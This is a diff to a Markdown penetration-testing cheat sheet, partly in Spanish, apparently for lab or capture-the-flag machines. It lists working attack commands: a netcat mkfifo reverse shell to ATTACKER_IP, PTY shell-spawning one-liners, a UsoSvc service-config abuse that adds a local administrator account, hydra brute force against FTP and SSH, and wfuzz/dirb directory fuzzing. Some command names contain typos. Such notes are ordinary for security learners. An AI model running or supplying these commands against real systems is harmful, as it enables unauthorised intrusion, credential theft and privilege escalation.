@@ -7,6 +7,7 @@ Table of Contents
 =================
   * [Table of Contents](#table-of-contents)
   * [<strong>Recon</strong>](#recon)
+    * [netdiscover](#netdiscover)
     * [nmap](#nmap)
     * [Port 21 - FTP](#port-21---ftp)
     * [Port 80 - HTTP](#port-80---http)
@@ -18,16 +19,26 @@ Table of Contents
     * [Linux](#linux)
       * [Info](#linux-info)
       * [Reverse Shell](#reverse-shell)
+      * [Post-Explotacion](#Post-Explotacion)
     * [Windows](#windows)
       * [Info](#windows-info)
       * [Abusing UsoSvc](#abusing-usosvc)
+  * [WEB](#web)
+    * [Fuzzing](#Fuzzing)
+    * [Brute Forxe](#Brute-Force)
   * [Cracking](#cracking)
   * [Tunnel SSH](#tunel-ssh)
 
 
-[comment]: # (brup suite, vega, webscarab,ua-tester, ssh-keyscan)
+[comment]: # (brup suite, vega, webscarab,ua-tester, ssh-keyscan, SQL-injection, ironwaf, (tmux + zsh), xargs, script del TTL)
 
 # **Recon**
+
+## netdiscover
+
+```
+netdiscoer -i <interface>
+```
 
 ## nmap
 ``` 
@@ -42,6 +53,14 @@ nmap -sV -sC -sU 10.10.10.10
 
 # Nmap Scripts
 nmap -sV --script http-vuln-cve2006-3392 -p10000 10.10.10.10
+
+nmap -sT -sV -A -p- -T5 -v
+nmap -p- -v -sS -A -T4
+sT:TCP Connect
+sS:Syn Scan -> default
+-sU: UDP
+-A: detect os and services
+-sV: service detection
 ```
 
 ## Port 21 - FTP
@@ -116,8 +135,30 @@ netcat
 Attacker: nc -lvp 4444
 Victim: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
 
+#SPAWN SHELL
+- python -c 'import pty; pty.spawn("/bin/bash")'
+- python3 -c 'import pty; pty.spawn("/bin/bash")'
+- echo os.system('/bin/bash')
+- /bin/sh -i
+- perl -e 'exec "/bin/bash" '
+- lua: os.execute('/bin/sh')
+
 ```
 
+### Post-Explotacion
+```
+Revisar directorios:
+	/home
+	/tmp
+Crontabs
+Logs
+	syslog
+	messages
+Revisar servicios i procesos activos
+	ps -ef 
+	netstat -antp
+Buscar ficheros con permisos espciales SUID i GUID
+```
 
 ## windows
 
@@ -144,6 +185,40 @@ sc.exe stop UsoSvc
 sc.exe config UsoSvc binpath= "C:\Windows\System32\cmd.exe /c net user john Password123 /add && net localgroup Administrators john /add" 
 
 sc.exe start UsoSvc
+```
+# **WEB**
+
+## Fuzzing 
+```
+wfuzz -w wordlist/general/common.txt <ip>/FUZZ
+w: elige el fichero diccionario
+hs: ignora las respuestas, util para 400,404
+    -wfuzz --hc 404 -c --script=links -z list,index.html  http://10.10.10.10/FUZZ
+    -wfuzz --hc 404,400 -c -w wordlist/vulns/cgis.txt  http://10.10.10.10/FUZZ
+
+#FUZZ en POST
+wfuzz --hc 404,400 -c -w fuzzing_web/wfuzz/wfuzz/wordlist/general/common.txt  -d "route=FUZZ" http://10.10.10.10/content.php | grep -v ' 0 W'
+
+#Wfuzz con bucle en RANGO numerico
+wfuzz --hc 404,400 -z range,0-10000 http://10.10.10.10/tokens/tokenFUZZ.txt
+
+# DirBuster
+dirb http://10.10.10.10/ /path/to/Diccionario
+
+```
+## webApps
+
+```
+# wrodpress
+wpscan --url http://10.10.10.10/
+```
+
+## Brute Force
+
+```
+#Hydra
+hydra -L usuaris.txt -P rockyou-withcount.txt 10.10.10.10 ftp -e nsr
+hydra -s 22 -l demonslayer -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh
 ```
 
 # Cracking
